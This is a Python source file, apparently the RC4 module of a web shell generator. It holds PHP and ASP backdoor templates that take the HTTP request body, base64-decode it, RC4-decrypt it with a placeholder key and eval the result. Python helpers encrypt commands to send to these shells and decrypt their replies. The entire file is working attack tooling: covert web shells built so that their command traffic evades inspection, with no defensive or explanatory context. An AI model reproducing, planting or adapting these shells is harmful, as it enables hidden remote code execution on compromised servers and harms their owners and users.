# obfuscators/RC4.py

import base64
import textwrap

dicPayload = {
    'php' : textwrap.dedent('''
        <?php

        function rc4_crypt($data, $key) {
            // Key Scheduling Algorithm (KSA)
            $S = range(0, 255);
            $j = 0;
            $keyLength = strlen($key);

            for ($i = 0; $i < 256; $i++) {
                $j = ($j + $S[$i] + ord($key[$i % $keyLength])) % 256;
                $tmp = $S[$i];
                $S[$i] = $S[$j];
                $S[$j] = $tmp;
            }

            // Pseudo-Random Generation Algorithm (PRGA)
            $i = 0;
            $j = 0;
            $out = '';

            $dataLength = strlen($data);

            for ($k = 0; $k < $dataLength; $k++) {
                $i = ($i + 1) % 256;
                $j = ($j + $S[$i]) % 256;

                $tmp = $S[$i];
                $S[$i] = $S[$j];
                $S[$j] = $tmp;

                $t = ($S[$i] + $S[$j]) % 256;
                $out .= chr(ord($data[$k]) ^ $S[$t]);
            }

            return $out;
        }

        $KEY = "[RC4_KEY]";
        $rawInput = file_get_contents("php://input");
        $encryptedBytes = base64_decode($rawInput);
        $decrypted = rc4_crypt($encryptedBytes, $KEY);
        eval($decrypted);
                            
        ?>
        ''').strip(),

    'asp' : textwrap.dedent('''
        Function RC4(data, key)
            Dim S(255)
            Dim i, j, k, t, tmp
            Dim out, keyLen, dataLen

            keyLen = Len(key)
            dataLen = Len(data)

            ' KSA
            For i = 0 To 255
                S(i) = i
            Next

            j = 0
            For i = 0 To 255
                j = (j + S(i) + Asc(Mid(key, (i Mod keyLen) + 1, 1))) Mod 256
                tmp = S(i)
                S(i) = S(j)
                S(j) = tmp
            Next

            ' PRGA
            i = 0
            j = 0
            out = ""

            For k = 1 To dataLen
                i = (i + 1) Mod 256
                j = (j + S(i)) Mod 256

                tmp = S(i)
                S(i) = S(j)
                S(j) = tmp

                t = (S(i) + S(j)) Mod 256
                out = out & Chr(Asc(Mid(data, k, 1)) Xor S(t))
            Next

            RC4 = out
        End Function
                                    
        Dim raw, decoded, key

        key = "[RC4_KEY]"
        raw = Request.BinaryRead(Request.TotalBytes)

        Dim stream
        Set stream = Server.CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write raw
        stream.Position = 0
        stream.Type = 2
        stream.Charset = "utf-8"

        decoded = stream.ReadText
        stream.Close
        Set stream = Nothing

        Function Base64Decode(ByVal str)
            Dim xml, node
            Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
            Set node = xml.createElement("b64")
            node.DataType = "bin.base64"
            node.Text = str
            Base64Decode = node.NodeTypedValue
            Set node = Nothing
            Set xml = Nothing
        End Function

        Dim encrypted
        encrypted = Base64Decode(decoded)

        Dim plaintext
        plaintext = RC4(encrypted, key)

        eval plaintext
        ''').strip()

}

def _rc4_crypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    # Pseudo-random generation algorithm (PRGA)
    out = bytearray()
    i = 0
    j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        out.append(byte ^ S[t])
        
    return bytes(out)

def build(payload, script, key, **kwargs):
    return dicPayload[script].replace('[RC4_KEY]', key)

def obfuscate(payload, raw=False, encoding='utf-8', key="default_key", **kwargs):
    
    data_bytes = payload.encode(encoding)
    key_bytes = key.encode(encoding)
    
    encrypted_bytes = _rc4_crypt(data_bytes, key_bytes)

    return base64.b64encode(encrypted_bytes).decode(encoding)

def deobfuscate(payload, raw=False, encoding='utf-8', key="default_key", **kwargs):
    
    encrypted_bytes = base64.b64decode(payload.encode(encoding))
    key_bytes = key.encode(encoding)
    
    decrypted_bytes = _rc4_crypt(encrypted_bytes, key_bytes)

    return decrypted_bytes.decode(encoding)
